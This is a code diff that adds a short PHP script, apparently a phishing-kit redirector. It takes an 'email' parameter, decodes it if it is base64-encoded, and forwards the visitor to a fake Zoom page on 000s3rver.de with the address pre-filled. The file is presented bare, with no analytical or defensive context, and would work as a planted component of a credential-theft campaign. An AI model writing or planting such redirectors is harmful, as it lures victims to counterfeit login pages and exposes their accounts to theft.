@@ -1,0 +1,12 @@
+<?php
+
+if (isset($_GET['email'])) {
+    $email = $_GET['email'];
+    if (base64_encode(base64_decode($email, true)) === $email) {
+        $email = base64_decode($email);
+    }
+    header("Location: https://000s3rver.de/zoom/pages.html#$email");
+    exit();
+}
+
+?>
